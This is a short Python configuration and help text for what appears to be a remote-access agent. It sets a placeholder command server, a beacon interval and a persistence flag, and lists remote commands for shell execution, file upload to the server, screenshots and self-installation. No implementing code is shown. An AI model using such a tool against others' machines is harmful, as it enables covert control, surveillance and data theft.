SERVER = "__SERVER__"
HELLO_INTERVAL = 30  # Default value, adjust as needed
IDLE_TIME = 60       # Default value, adjust as needed
MAX_FAILED_CONNECTIONS = 5  # Default value, adjust as needed
PERSIST = False      # Default value, adjust as needed
HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

python <command|file>
Runs a Python command or local file.

persist
Installs the agent.

clean
Uninstalls the agent.

exit
Kills the agent.
"""
